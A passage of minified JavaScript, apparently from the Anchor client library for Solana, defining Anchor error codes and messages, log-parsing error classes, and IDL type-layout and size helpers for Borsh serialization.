      th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_GROUP_ADDRESS =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_AUTHORITY =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION =
      th.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_TOKEN_TOKEN_PROGRAM =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_TOKEN_PROGRAM =
      th.ANCHOR_ERROR__CONSTRAINT_TOKEN_TOKEN_PROGRAM =
      th.ANCHOR_ERROR__CONSTRAINT_ACCOUNT_IS_NONE =
      th.ANCHOR_ERROR__CONSTRAINT_SPACE =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_DECIMALS =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_FREEZE_AUTHORITY =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_MINT_AUTHORITY =
      th.ANCHOR_ERROR__CONSTRAINT_TOKEN_OWNER =
      th.ANCHOR_ERROR__CONSTRAINT_TOKEN_MINT =
      th.ANCHOR_ERROR__CONSTRAINT_ZERO =
      th.ANCHOR_ERROR__CONSTRAINT_ADDRESS =
      th.ANCHOR_ERROR__CONSTRAINT_CLOSE =
      th.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_INIT =
      th.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED =
      th.ANCHOR_ERROR__CONSTRAINT_STATE =
      th.ANCHOR_ERROR__CONSTRAINT_EXECUTABLE =
      th.ANCHOR_ERROR__CONSTRAINT_SEEDS =
      th.ANCHOR_ERROR__CONSTRAINT_RENT_EXEMPT =
      th.ANCHOR_ERROR__CONSTRAINT_OWNER =
      th.ANCHOR_ERROR__CONSTRAINT_RAW =
      th.ANCHOR_ERROR__CONSTRAINT_SIGNER =
      th.ANCHOR_ERROR__CONSTRAINT_HAS_ONE =
      th.ANCHOR_ERROR__CONSTRAINT_MUT =
      th.ANCHOR_ERROR__EVENT_INSTRUCTION_STUB =
      th.ANCHOR_ERROR__IDL_ACCOUNT_NOT_EMPTY =
      th.ANCHOR_ERROR__IDL_INSTRUCTION_INVALID_PROGRAM =
      th.ANCHOR_ERROR__IDL_INSTRUCTION_STUB =
      th.ANCHOR_ERROR__INSTRUCTION_DID_NOT_SERIALIZE =
      th.ANCHOR_ERROR__INSTRUCTION_DID_NOT_DESERIALIZE =
      th.ANCHOR_ERROR__INSTRUCTION_FALLBACK_NOT_FOUND =
      th.ANCHOR_ERROR__INSTRUCTION_MISSING =
        void 0),
    nh =
      (th.ANCHOR_ERROR__DEPRECATED =
      th.ANCHOR_ERROR__INVALID_NUMERIC_CONVERSION =
      th.ANCHOR_ERROR__TRYING_TO_INIT_PAYER_AS_PROGRAM_ACCOUNT =
      th.ANCHOR_ERROR__DECLARED_PROGRAM_ID_MISMATCH =
      th.ANCHOR_ERROR__ACCOUNT_DUPLICATE_REALLOCS =
      th.ANCHOR_ERROR__ACCOUNT_REALLOC_EXCEEDS_LIMIT =
      th.ANCHOR_ERROR__ACCOUNT_SYSVAR_MISMATCH =
      th.ANCHOR_ERROR__ACCOUNT_NOT_ASSOCIATED_TOKEN_ACCOUNT =
      th.ANCHOR_ERROR__ACCOUNT_NOT_PROGRAM_DATA =
      th.ANCHOR_ERROR__ACCOUNT_NOT_INITIALIZED =
      th.ANCHOR_ERROR__ACCOUNT_NOT_SYSTEM_OWNED =
      th.ANCHOR_ERROR__ACCOUNT_NOT_SIGNER =
      th.ANCHOR_ERROR__INVALID_PROGRAM_EXECUTABLE =
      th.ANCHOR_ERROR__INVALID_PROGRAM_ID =
      th.ANCHOR_ERROR__ACCOUNT_OWNED_BY_WRONG_PROGRAM =
      th.ANCHOR_ERROR__ACCOUNT_NOT_MUTABLE =
      th.ANCHOR_ERROR__ACCOUNT_NOT_ENOUGH_KEYS =
      th.ANCHOR_ERROR__ACCOUNT_DID_NOT_SERIALIZE =
      th.ANCHOR_ERROR__ACCOUNT_DID_NOT_DESERIALIZE =
      th.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_MISMATCH =
      th.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_NOT_FOUND =
      th.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_ALREADY_SET =
      th.ANCHOR_ERROR__REQUIRE_GTE_VIOLATED =
      th.ANCHOR_ERROR__REQUIRE_GT_VIOLATED =
      th.ANCHOR_ERROR__REQUIRE_KEYS_NEQ_VIOLATED =
      th.ANCHOR_ERROR__REQUIRE_NEQ_VIOLATED =
      th.ANCHOR_ERROR__REQUIRE_KEYS_EQ_VIOLATED =
        void 0),
    rh = (th.ANCHOR_ERROR__INSTRUCTION_MISSING = 100),
    oh = (th.ANCHOR_ERROR__INSTRUCTION_FALLBACK_NOT_FOUND = 101),
    ih = (th.ANCHOR_ERROR__INSTRUCTION_DID_NOT_DESERIALIZE = 102),
    sh = (th.ANCHOR_ERROR__INSTRUCTION_DID_NOT_SERIALIZE = 103),
    ah = (th.ANCHOR_ERROR__IDL_INSTRUCTION_STUB = 1e3),
    uh = (th.ANCHOR_ERROR__IDL_INSTRUCTION_INVALID_PROGRAM = 1001),
    ch = (th.ANCHOR_ERROR__IDL_ACCOUNT_NOT_EMPTY = 1002),
    lh = (th.ANCHOR_ERROR__EVENT_INSTRUCTION_STUB = 1500),
    dh = (th.ANCHOR_ERROR__CONSTRAINT_MUT = 2e3),
    fh = (th.ANCHOR_ERROR__CONSTRAINT_HAS_ONE = 2001),
    hh = (th.ANCHOR_ERROR__CONSTRAINT_SIGNER = 2002),
    ph = (th.ANCHOR_ERROR__CONSTRAINT_RAW = 2003),
    mh = (th.ANCHOR_ERROR__CONSTRAINT_OWNER = 2004),
    gh = (th.ANCHOR_ERROR__CONSTRAINT_RENT_EXEMPT = 2005),
    yh = (th.ANCHOR_ERROR__CONSTRAINT_SEEDS = 2006),
    wh = (th.ANCHOR_ERROR__CONSTRAINT_EXECUTABLE = 2007),
    bh = (th.ANCHOR_ERROR__CONSTRAINT_STATE = 2008),
    vh = (th.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED = 2009),
    Ah = (th.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_INIT = 2010),
    kh = (th.ANCHOR_ERROR__CONSTRAINT_CLOSE = 2011),
    Ih = (th.ANCHOR_ERROR__CONSTRAINT_ADDRESS = 2012),
    Sh = (th.ANCHOR_ERROR__CONSTRAINT_ZERO = 2013),
    _h = (th.ANCHOR_ERROR__CONSTRAINT_TOKEN_MINT = 2014),
    Th = (th.ANCHOR_ERROR__CONSTRAINT_TOKEN_OWNER = 2015),
    Bh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_MINT_AUTHORITY = 2016),
    Ch = (th.ANCHOR_ERROR__CONSTRAINT_MINT_FREEZE_AUTHORITY = 2017),
    Eh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_DECIMALS = 2018),
    xh = (th.ANCHOR_ERROR__CONSTRAINT_SPACE = 2019),
    Ph = (th.ANCHOR_ERROR__CONSTRAINT_ACCOUNT_IS_NONE = 2020),
    Oh = (th.ANCHOR_ERROR__CONSTRAINT_TOKEN_TOKEN_PROGRAM = 2021),
    Rh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_TOKEN_PROGRAM = 2022),
    Mh = (th.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_TOKEN_TOKEN_PROGRAM = 2023),
    Lh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION = 2024),
    Nh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_AUTHORITY = 2025),
    Dh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_GROUP_ADDRESS = 2026),
    Uh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION = 2027),
    qh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_AUTHORITY = 2028),
    zh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_MEMBER_ADDRESS = 2029),
    Kh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION = 2030),
    Wh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_AUTHORITY = 2031),
    Fh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_METADATA_ADDRESS = 2032),
    jh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION = 2033),
    Gh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION_AUTHORITY = 2034),
    Vh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION = 2035),
    Hh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION_DELEGATE = 2036),
    Zh = (th.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION = 2037),
    Xh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_AUTHORITY = 2038),
    Jh =
      (th.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_PROGRAM_ID = 2039),
    Yh = (th.ANCHOR_ERROR__REQUIRE_VIOLATED = 2500);
  eh = th.ANCHOR_ERROR__REQUIRE_EQ_VIOLATED = 2501;
  var Qh = (th.ANCHOR_ERROR__REQUIRE_KEYS_EQ_VIOLATED = 2502),
    $h = (th.ANCHOR_ERROR__REQUIRE_NEQ_VIOLATED = 2503),
    tp = (th.ANCHOR_ERROR__REQUIRE_KEYS_NEQ_VIOLATED = 2504),
    ep = (th.ANCHOR_ERROR__REQUIRE_GT_VIOLATED = 2505),
    np = (th.ANCHOR_ERROR__REQUIRE_GTE_VIOLATED = 2506),
    rp = (th.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_ALREADY_SET = 3e3),
    op = (th.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_NOT_FOUND = 3001),
    ip = (th.ANCHOR_ERROR__ACCOUNT_DISCRIMINATOR_MISMATCH = 3002),
    sp = (th.ANCHOR_ERROR__ACCOUNT_DID_NOT_DESERIALIZE = 3003),
    ap = (th.ANCHOR_ERROR__ACCOUNT_DID_NOT_SERIALIZE = 3004),
    up = (th.ANCHOR_ERROR__ACCOUNT_NOT_ENOUGH_KEYS = 3005),
    cp = (th.ANCHOR_ERROR__ACCOUNT_NOT_MUTABLE = 3006),
    lp = (th.ANCHOR_ERROR__ACCOUNT_OWNED_BY_WRONG_PROGRAM = 3007),
    dp = (th.ANCHOR_ERROR__INVALID_PROGRAM_ID = 3008),
    fp = (th.ANCHOR_ERROR__INVALID_PROGRAM_EXECUTABLE = 3009),
    hp = (th.ANCHOR_ERROR__ACCOUNT_NOT_SIGNER = 3010),
    pp = (th.ANCHOR_ERROR__ACCOUNT_NOT_SYSTEM_OWNED = 3011),
    mp = (th.ANCHOR_ERROR__ACCOUNT_NOT_INITIALIZED = 3012),
    gp = (th.ANCHOR_ERROR__ACCOUNT_NOT_PROGRAM_DATA = 3013),
    yp = (th.ANCHOR_ERROR__ACCOUNT_NOT_ASSOCIATED_TOKEN_ACCOUNT = 3014),
    wp = (th.ANCHOR_ERROR__ACCOUNT_SYSVAR_MISMATCH = 3015),
    bp = (th.ANCHOR_ERROR__ACCOUNT_REALLOC_EXCEEDS_LIMIT = 3016),
    vp = (th.ANCHOR_ERROR__ACCOUNT_DUPLICATE_REALLOCS = 3017),
    Ap = (th.ANCHOR_ERROR__DECLARED_PROGRAM_ID_MISMATCH = 4100),
    kp = (th.ANCHOR_ERROR__TRYING_TO_INIT_PAYER_AS_PROGRAM_ACCOUNT = 4101),
    Ip = (th.ANCHOR_ERROR__INVALID_NUMERIC_CONVERSION = 4102);
  nh = th.ANCHOR_ERROR__DEPRECATED = 5e3;
  const Sp = new Map();
  function _p(t) {
    return void 0 !== Sp.get(t);
  }
  class Tp extends Error {
    constructor(t) {
      super(t), (this.name = "IdlError");
    }
  }
  class Bp {
    constructor(t) {
      this.stack = t;
    }
    static parse(t) {
      var e;
      const n = /^Program (\w*) invoke/,
        r = /^Program \w* success/,
        o = [];
      for (let i = 0; i < t.length; i++) {
        if (r.exec(t[i])) {
          o.pop();
          continue;
        }
        const s = null === (e = n.exec(t[i])) || void 0 === e ? void 0 : e[1];
        s && o.push(new Ji(s));
      }
      return new Bp(o);
    }
  }
  class Cp extends Error {
    constructor(t, e, n, r, o, i) {
      super(n.join("\n").replace("Program log: ", "")),
        (this.errorLogs = n),
        (this.logs = r),
        (this.error = {
          errorCode: t,
          errorMessage: e,
          comparedValues: i,
          origin: o,
        }),
        (this._programErrorStack = Bp.parse(r));
    }
    static parse(t) {
      if (!t) return null;
      const e = t.findIndex((t) => t.startsWith("Program log: AnchorError"));
      if (-1 === e) return null;
      const n = t[e],
        r = [n];
      let o;
      if (e + 1 < t.length)
        if ("Program log: Left:" === t[e + 1]) {
          const n = /^Program log: (.*)$/,
            i = n.exec(t[e + 2])[1],
            s = n.exec(t[e + 4])[1];
          (o = [new Ji(i), new Ji(s)]), r.push(...t.slice(e + 1, e + 5));
        } else if (t[e + 1].startsWith("Program log: Left:")) {
          const n = /^Program log: (Left|Right): (.*)$/,
            i = n.exec(t[e + 1])[2],
            s = n.exec(t[e + 2])[2];
          r.push(...t.slice(e + 1, e + 3)), (o = [i, s]);
        }
      const i =
          /^Program log: AnchorError occurred\. Error Code: (.*)\. Error Number: (\d*)\. Error Message: (.*)\./.exec(
            n
          ),
        s =
          /^Program log: AnchorError thrown in (.*):(\d*)\. Error Code: (.*)\. Error Number: (\d*)\. Error Message: (.*)\./.exec(
            n
          ),
        a =
          /^Program log: AnchorError caused by account: (.*)\. Error Code: (.*)\. Error Number: (\d*)\. Error Message: (.*)\./.exec(
            n
          );
      if (i) {
        const [e, n, s] = i.slice(1, 4),
          a = { code: e, number: parseInt(n) };
        return new Cp(a, s, r, t, void 0, o);
      }
      if (s) {
        const [e, n, i, a, u] = s.slice(1, 6),
          c = { code: i, number: parseInt(a) },
          l = { file: e, line: parseInt(n) };
        return new Cp(c, u, r, t, l, o);
      }
      if (a) {
        const [e, n, i, s] = a.slice(1, 5),
          u = e,
          c = { code: n, number: parseInt(i) };
        return new Cp(c, s, r, t, u, o);
      }
      return null;
    }
    get program() {
      return this._programErrorStack.stack[
        this._programErrorStack.stack.length - 1
      ];
    }
    get programErrorStack() {
      return this._programErrorStack.stack;
    }
    toString() {
      return this.message;
    }
  }
  class Ep extends Error {
    constructor(t, e, n) {
      super(),
        (this.code = t),
        (this.msg = e),
        (this.logs = n),
        n && (this._programErrorStack = Bp.parse(n));
    }
    static parse(t, e) {
      const n = t.toString();
      let r, o;
      if (n.includes("custom program error:")) {
        let t = n.split("custom program error: ");
        if (2 !== t.length) return null;
        r = t[1];
      } else {
        const t = n.match(/"Custom":([0-9]+)}/g);
        if (!t || t.length > 1) return null;
        r = t[0].match(/([0-9]+)/g)[0];
      }
      try {
        o = parseInt(r);
      } catch (s) {
        return null;
      }
      let i = e.get(o);
      return void 0 !== i
        ? new Ep(o, i, t.logs)
        : ((i = Op.get(o)), void 0 !== i ? new Ep(o, i, t.logs) : null);
    }
    get program() {
      var t;
      return null === (t = this._programErrorStack) || void 0 === t
        ? void 0
        : t.stack[this._programErrorStack.stack.length - 1];
    }
    get programErrorStack() {
      var t;
      return null === (t = this._programErrorStack) || void 0 === t
        ? void 0
        : t.stack;
    }
    toString() {
      return this.msg;
    }
  }
  function xp(t, e) {
    _p("debug-logs"), 0;
    const n = Cp.parse(t.logs);
    if (n) return n;
    const r = Ep.parse(t, e);
    if (r) return r;
    if (t.logs) {
      const e = {
        get: function (e, n) {
          return "programErrorStack" === n
            ? e.programErrorStack.stack
            : "program" === n
            ? e.programErrorStack.stack[t.programErrorStack.stack.length - 1]
            : Reflect.get(...arguments);
        },
      };
      return (t.programErrorStack = Bp.parse(t.logs)), new Proxy(t, e);
    }
    return t;
  }
  const Pp = {
      InstructionMissing: rh,
      InstructionFallbackNotFound: oh,
      InstructionDidNotDeserialize: ih,
      InstructionDidNotSerialize: sh,
      IdlInstructionStub: ah,
      IdlInstructionInvalidProgram: uh,
      IdlAccountNotEmpty: ch,
      EventInstructionStub: lh,
      ConstraintMut: dh,
      ConstraintHasOne: fh,
      ConstraintSigner: hh,
      ConstraintRaw: ph,
      ConstraintOwner: mh,
      ConstraintRentExempt: gh,
      ConstraintSeeds: yh,
      ConstraintExecutable: wh,
      ConstraintState: bh,
      ConstraintAssociated: vh,
      ConstraintAssociatedInit: Ah,
      ConstraintClose: kh,
      ConstraintAddress: Ih,
      ConstraintZero: Sh,
      ConstraintTokenMint: _h,
      ConstraintTokenOwner: Th,
      ConstraintMintMintAuthority: Bh,
      ConstraintMintFreezeAuthority: Ch,
      ConstraintMintDecimals: Eh,
      ConstraintSpace: xh,
      ConstraintAccountIsNone: Ph,
      ConstraintTokenTokenProgram: Oh,
      ConstraintMintTokenProgram: Rh,
      ConstraintAssociatedTokenTokenProgram: Mh,
      ConstraintMintGroupPointerExtension: Lh,
      ConstraintMintGroupPointerExtensionAuthority: Nh,
      ConstraintMintGroupPointerExtensionGroupAddress: Dh,
      ConstraintMintGroupMemberPointerExtension: Uh,
      ConstraintMintGroupMemberPointerExtensionAuthority: qh,
      ConstraintMintGroupMemberPointerExtensionMemberAddress: zh,
      ConstraintMintMetadataPointerExtension: Kh,
      ConstraintMintMetadataPointerExtensionAuthority: Wh,
      ConstraintMintMetadataPointerExtensionMetadataAddress: Fh,
      ConstraintMintCloseAuthorityExtension: jh,
      ConstraintMintCloseAuthorityExtensionAuthority: Gh,
      ConstraintMintPermanentDelegateExtension: Vh,
      ConstraintMintPermanentDelegateExtensionDelegate: Hh,
      ConstraintMintTransferHookExtension: Zh,
      ConstraintMintTransferHookExtensionAuthority: Xh,
      ConstraintMintTransferHookExtensionProgramId: Jh,
      RequireViolated: Yh,
      RequireEqViolated: eh,
      RequireKeysEqViolated: Qh,
      RequireNeqViolated: $h,
      RequireKeysNeqViolated: tp,
      RequireGtViolated: ep,
      RequireGteViolated: np,
      AccountDiscriminatorAlreadySet: rp,
      AccountDiscriminatorNotFound: op,
      AccountDiscriminatorMismatch: ip,
      AccountDidNotDeserialize: sp,
      AccountDidNotSerialize: ap,
      AccountNotEnoughKeys: up,
      AccountNotMutable: cp,
      AccountOwnedByWrongProgram: lp,
      InvalidProgramId: dp,
      InvalidProgramExecutable: fp,
      AccountNotSigner: hp,
      AccountNotSystemOwned: pp,
      AccountNotInitialized: mp,
      AccountNotProgramData: gp,
      AccountNotAssociatedTokenAccount: yp,
      AccountSysvarMismatch: wp,
      AccountReallocExceedsLimit: bp,
      AccountDuplicateReallocs: vp,
      DeclaredProgramIdMismatch: Ap,
      TryingToInitPayerAsProgramAccount: kp,
      InvalidNumericConversion: Ip,
      Deprecated: nh,
    },
    Op = new Map([
      [Pp.InstructionMissing, "Instruction discriminator not provided"],
      [Pp.InstructionFallbackNotFound, "Fallback functions are not supported"],
      [
        Pp.InstructionDidNotDeserialize,
        "The program could not deserialize the given instruction",
      ],
      [
        Pp.InstructionDidNotSerialize,
        "The program could not serialize the given instruction",
      ],
      [
        Pp.IdlInstructionStub,
        "The program was compiled without idl instructions",
      ],
      [
        Pp.IdlInstructionInvalidProgram,
        "The transaction was given an invalid program for the IDL instruction",
      ],
      [
        Pp.IdlAccountNotEmpty,
        "IDL account must be empty in order to resize, try closing first",
      ],
      [
        Pp.EventInstructionStub,
        "The program was compiled without `event-cpi` feature",
      ],
      [Pp.ConstraintMut, "A mut constraint was violated"],
      [Pp.ConstraintHasOne, "A has one constraint was violated"],
      [Pp.ConstraintSigner, "A signer constraint was violated"],
      [Pp.ConstraintRaw, "A raw constraint was violated"],
      [Pp.ConstraintOwner, "An owner constraint was violated"],
      [Pp.ConstraintRentExempt, "A rent exemption constraint was violated"],
      [Pp.ConstraintSeeds, "A seeds constraint was violated"],
      [Pp.ConstraintExecutable, "An executable constraint was violated"],
      [
        Pp.ConstraintState,
        "Deprecated Error, feel free to replace with something else",
      ],
      [Pp.ConstraintAssociated, "An associated constraint was violated"],
      [
        Pp.ConstraintAssociatedInit,
        "An associated init constraint was violated",
      ],
      [Pp.ConstraintClose, "A close constraint was violated"],
      [Pp.ConstraintAddress, "An address constraint was violated"],
      [Pp.ConstraintZero, "Expected zero account discriminant"],
      [Pp.ConstraintTokenMint, "A token mint constraint was violated"],
      [Pp.ConstraintTokenOwner, "A token owner constraint was violated"],
      [
        Pp.ConstraintMintMintAuthority,
        "A mint mint authority constraint was violated",
      ],
      [
        Pp.ConstraintMintFreezeAuthority,
        "A mint freeze authority constraint was violated",
      ],
      [Pp.ConstraintMintDecimals, "A mint decimals constraint was violated"],
      [Pp.ConstraintSpace, "A space constraint was violated"],
      [
        Pp.ConstraintAccountIsNone,
        "A required account for the constraint is None",
      ],
      [
        Pp.ConstraintTokenTokenProgram,
        "A token account token program constraint was violated",
      ],
      [
        Pp.ConstraintMintTokenProgram,
        "A mint token program constraint was violated",
      ],
      [
        Pp.ConstraintAssociatedTokenTokenProgram,
        "An associated token account token program constraint was violated",
      ],
      [
        Pp.ConstraintMintGroupPointerExtension,
        "A group pointer extension constraint was violated",
      ],
      [
        Pp.ConstraintMintGroupPointerExtensionAuthority,
        "A group pointer extension authority constraint was violated",
      ],
      [
        Pp.ConstraintMintGroupPointerExtensionGroupAddress,
        "A group pointer extension group address constraint was violated",
      ],
      [
        Pp.ConstraintMintGroupMemberPointerExtension,
        "A group member pointer extension constraint was violated",
      ],
      [
        Pp.ConstraintMintGroupMemberPointerExtensionAuthority,
        "A group member pointer extension authority constraint was violated",
      ],
      [
        Pp.ConstraintMintGroupMemberPointerExtensionMemberAddress,
        "A group member pointer extension group address constraint was violated",
      ],
      [
        Pp.ConstraintMintMetadataPointerExtension,
        "A metadata pointer extension constraint was violated",
      ],
      [
        Pp.ConstraintMintMetadataPointerExtensionAuthority,
        "A metadata pointer extension authority constraint was violated",
      ],
      [
        Pp.ConstraintMintMetadataPointerExtensionMetadataAddress,
        "A metadata pointer extension metadata address constraint was violated",
      ],
      [
        Pp.ConstraintMintCloseAuthorityExtension,
        "A close authority constraint was violated",
      ],
      [
        Pp.ConstraintMintCloseAuthorityExtensionAuthority,
        "A close authority extension authority constraint was violated",
      ],
      [
        Pp.ConstraintMintPermanentDelegateExtension,
        "A permanent delegate extension constraint was violated",
      ],
      [
        Pp.ConstraintMintPermanentDelegateExtensionDelegate,
        "A permanent delegate extension delegate constraint was violated",
      ],
      [
        Pp.ConstraintMintTransferHookExtension,
        "A transfer hook extension constraint was violated",
      ],
      [
        Pp.ConstraintMintTransferHookExtensionAuthority,
        "A transfer hook extension authority constraint was violated",
      ],
      [
        Pp.ConstraintMintTransferHookExtensionProgramId,
        "A transfer hook extension transfer hook program id constraint was violated",
      ],
      [Pp.RequireViolated, "A require expression was violated"],
      [Pp.RequireEqViolated, "A require_eq expression was violated"],
      [Pp.RequireKeysEqViolated, "A require_keys_eq expression was violated"],
      [Pp.RequireNeqViolated, "A require_neq expression was violated"],
      [Pp.RequireKeysNeqViolated, "A require_keys_neq expression was violated"],
      [Pp.RequireGtViolated, "A require_gt expression was violated"],
      [Pp.RequireGteViolated, "A require_gte expression was violated"],
      [
        Pp.AccountDiscriminatorAlreadySet,
        "The account discriminator was already set on this account",
      ],
      [
        Pp.AccountDiscriminatorNotFound,
        "No discriminator was found on the account",
      ],
      [
        Pp.AccountDiscriminatorMismatch,
        "Account discriminator did not match what was expected",
      ],
      [Pp.AccountDidNotDeserialize, "Failed to deserialize the account"],
      [Pp.AccountDidNotSerialize, "Failed to serialize the account"],
      [
        Pp.AccountNotEnoughKeys,
        "Not enough account keys given to the instruction",
      ],
      [Pp.AccountNotMutable, "The given account is not mutable"],
      [
        Pp.AccountOwnedByWrongProgram,
        "The given account is owned by a different program than expected",
      ],
      [Pp.InvalidProgramId, "Program ID was not as expected"],
      [Pp.InvalidProgramExecutable, "Program account is not executable"],
      [Pp.AccountNotSigner, "The given account did not sign"],
      [
        Pp.AccountNotSystemOwned,
        "The given account is not owned by the system program",
      ],
      [
        Pp.AccountNotInitialized,
        "The program expected this account to be already initialized",
      ],
      [
        Pp.AccountNotProgramData,
        "The given account is not a program data account",
      ],
      [
        Pp.AccountNotAssociatedTokenAccount,
        "The given account is not the associated token account",
      ],
      [
        Pp.AccountSysvarMismatch,
        "The given public key does not match the required sysvar",
      ],
      [
        Pp.AccountReallocExceedsLimit,
        "The account reallocation exceeds the MAX_PERMITTED_DATA_INCREASE limit",
      ],
      [
        Pp.AccountDuplicateReallocs,
        "The account was duplicated for more than one reallocation",
      ],
      [
        Pp.DeclaredProgramIdMismatch,
        "The declared program id does not match the actual program id",
      ],
      [
        Pp.TryingToInitPayerAsProgramAccount,
        "You cannot/should not initialize the payer account as a program account",
      ],
      [
        Pp.InvalidNumericConversion,
        "The program could not perform the numeric conversion, out of range integral type conversion attempted",
      ],
      [
        Pp.Deprecated,
        "The API being used is deprecated and should no longer be used",
      ],
    ]);
  class Rp {
    static fieldLayout(t, e = [], n) {
      const r = t.name;
      switch (t.type) {
        case "bool":
          return Fl.bool(r);
        case "u8":
          return Fl.u8(r);
        case "i8":
          return Fl.i8(r);
        case "u16":
          return Fl.u16(r);
        case "i16":
          return Fl.i16(r);
        case "u32":
          return Fl.u32(r);
        case "i32":
          return Fl.i32(r);
        case "f32":
          return Fl.f32(r);
        case "u64":
          return Fl.u64(r);
        case "i64":
          return Fl.i64(r);
        case "f64":
          return Fl.f64(r);
        case "u128":
          return Fl.u128(r);
        case "i128":
          return Fl.i128(r);
        case "u256":
          return Fl.u256(r);
        case "i256":
          return Fl.i256(r);
        case "bytes":
          return Fl.vecU8(r);
        case "string":
          return Fl.str(r);
        case "pubkey":
          return Fl.publicKey(r);
        default:
          if ("option" in t.type)
            return Fl.option(Rp.fieldLayout({ type: t.type.option }, e, n), r);
          if ("vec" in t.type)
            return Fl.vec(Rp.fieldLayout({ type: t.type.vec }, e, n), r);
          if ("array" in t.type) {
            let [o, i] = t.type.array;
            return (
              (i = Rp.resolveArrayLen(i, n)),
              Fl.array(Rp.fieldLayout({ type: o }, e, n), i, r)
            );
          }
          if ("defined" in t.type) {
            if (!e) throw new Tp("User defined types not provided");
            const o = t.type.defined.name,
              i = e.find((t) => t.name === o);
            if (!i) throw new Tp(`Type not found: ${t.name}`);
            return Rp.typeDefLayout({
              typeDef: i,
              types: e,
              genericArgs: null != n ? n : t.type.defined.generics,
              name: r,
            });
          }
          if ("generic" in t.type) {
            const r = null == n ? void 0 : n.at(0);
            if ("type" !== (null == r ? void 0 : r.kind))
              throw new Tp(`Invalid generic field: ${t.name}`);
            return Rp.fieldLayout({ ...t, type: r.type }, e);
          }
          throw new Tp(`Not yet implemented: ${JSON.stringify(t.type)}`);
      }
    }
    static typeDefLayout({ typeDef: t, types: e, name: n, genericArgs: r }) {
      switch (t.type.kind) {
        case "struct": {
          const o = yf(
            t.type.fields,
            () => [],
            (n) =>
              n.map((n) => {
                const o = r
                  ? Rp.resolveGenericArgs({
                      type: n.type,
                      typeDef: t,
                      genericArgs: r,
                    })
                  : r;
                return Rp.fieldLayout(n, e, o);
              }),
            (n) =>
              n.map((n, o) => {
                const i = r
                  ? Rp.resolveGenericArgs({
                      type: n,
                      typeDef: t,
                      genericArgs: r,
                    })
                  : r;
                return Rp.fieldLayout({ name: o.toString(), type: n }, e, i);
              })
          );
          return Fl.struct(o, n);
        }
        case "enum": {
          const o = t.type.variants.map((n) => {
            const o = yf(
              n.fields,
              () => [],
              (n) =>
                n.map((n) => {
                  const o = r
                    ? Rp.resolveGenericArgs({
                        type: n.type,
                        typeDef: t,
                        genericArgs: r,
                      })
                    : r;
                  return Rp.fieldLayout(n, e, o);
                }),
              (n) =>
                n.map((n, o) => {
                  const i = r
                    ? Rp.resolveGenericArgs({
                        type: n,
                        typeDef: t,
                        genericArgs: r,
                      })
                    : r;
                  return Rp.fieldLayout({ name: o.toString(), type: n }, e, i);
                })
            );
            return Fl.struct(o, n.name);
          });
          return void 0 !== n ? Fl.rustEnum(o).replicate(n) : Fl.rustEnum(o, n);
        }
        case "type":
          return Rp.fieldLayout({ type: t.type.alias, name: n }, e);
      }
    }
    static typeSize(t, e, n) {
      var r;
      switch (t) {
        case "bool":
        case "u8":
        case "i8":
        case "bytes":
        case "string":
          return 1;
        case "i16":
        case "u16":
          return 2;
        case "u32":
        case "i32":
        case "f32":
          return 4;
        case "u64":
        case "i64":
        case "f64":
          return 8;
        case "u128":
        case "i128":
          return 16;
        case "u256":
        case "i256":
        case "pubkey":
          return 32;
        default:
          if ("option" in t) return 1 + Rp.typeSize(t.option, e, n);
          if ("coption" in t) return 4 + Rp.typeSize(t.coption, e, n);
          if ("vec" in t) return 1;
          if ("array" in t) {
            let [r, o] = t.array;
            return (o = Rp.resolveArrayLen(o, n)), Rp.typeSize(r, e, n) * o;
          }
          if ("defined" in t) {
            const o =
              null === (r = e.types) || void 0 === r
                ? void 0
                : r.find((e) => e.name === t.defined.name);
            if (!o) throw new Tp(`Type not found: ${JSON.stringify(t)}`);
            const i = (r) => {
              const i = null != n ? n : t.defined.generics,
                s = i
                  ? Rp.resolveGenericArgs({
                      type: r,
                      typeDef: o,
                      genericArgs: i,
                    })
